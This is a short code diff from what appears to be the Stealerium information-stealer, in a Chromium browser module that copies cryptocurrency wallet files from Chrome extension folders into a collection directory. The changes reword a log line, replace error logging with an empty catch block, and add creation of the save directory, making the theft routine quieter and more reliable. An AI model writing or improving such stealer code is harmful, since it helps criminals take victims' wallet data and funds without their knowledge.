@@ -85,13 +85,13 @@ namespace Stealerium.Target.Browsers.Chromium
                 // If no wallets were copied, delete the save directory
                 if (walletsCopied == 0)
                 {
-                    Logging.Log("No wallets found. Deleting save directory.");
+                    Logging.Log("No wallets found in Chrome extensions.");
                     Filemanager.RecursiveDelete(saveDirectory);
                 }
             }
-            catch (Exception ex)
+            catch (Exception)
             {
-                Logging.Log($"Failed to collect wallets from Chrome browser: {ex.Message}");
+                //
             }
         }
 
@@ -103,8 +103,13 @@ namespace Stealerium.Target.Browsers.Chromium
                 // Check if the wallet directory exists
                 if (!Directory.Exists(walletDirectory))
                 {
-                    Logging.Log($"Wallet directory not found: {walletDirectory}");
                     return false;
+                }
+
+                // Create saveDirectory if it doesn't exist
+                if (!Directory.Exists(saveDirectory))
+                {
+                    Directory.CreateDirectory(saveDirectory);
                 }
 
                 // Create destination directory and copy files
